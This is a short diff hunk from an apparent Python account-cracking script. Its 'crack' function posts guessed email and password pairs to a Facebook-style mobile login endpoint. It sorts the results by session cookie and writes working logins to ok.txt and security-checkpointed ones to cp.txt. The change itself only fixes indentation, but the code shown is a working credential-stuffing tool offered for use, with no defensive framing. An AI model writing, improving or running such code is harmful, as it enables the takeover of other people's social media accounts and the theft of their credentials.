@@ -124,17 +124,17 @@ def crack(uid, pwx, host, **kwargs):
 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 			gaaa = ses.post(host+"/login/device-based/regular/login/?login_attempt=1",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
-                wrt = '%s|%s' % (user,pw)
-                ok.append(wrt)
-                open('ok.txt','a').write('%s\n' % wrt)
-                break
-                continue
+				wrt = '%s|%s' % (user,pw)
+				ok.append(wrt)
+				open('ok.txt','a').write('%s\n' % wrt)
+				break
+				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-                wrt = '%s|%s' % (user,pw)
-                cp.append(wrt)
-                open('cp.txt', 'a').write('%s\n' % wrt)
-                break
-                continue
+				wrt = '%s|%s' % (user,pw)
+				cp.append(wrt)
+				open('cp.txt', 'a').write('%s\n' % wrt)
+				break
+				continue
 
 		loop+=1
 			
